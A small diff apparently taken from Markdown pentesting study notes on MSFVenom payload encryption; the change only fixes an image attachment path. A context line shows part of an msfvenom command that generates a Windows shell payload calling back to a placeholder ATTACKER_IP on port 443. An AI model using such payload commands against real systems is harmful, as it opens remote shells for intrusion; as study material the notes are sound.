@@ -16,7 +16,7 @@ msfvenom -a x86 --platform Windows LHOST=ATTACKER_IP LPORT=443 -p windows/shell_
 
 # Encryption using MSFVenom
 
-![[Pasted image 20250706221100.png]]
+![[../../../../../attchments/Pasted image 20250706221100.png]]
 
 ```
 msfvenom --list encrypt
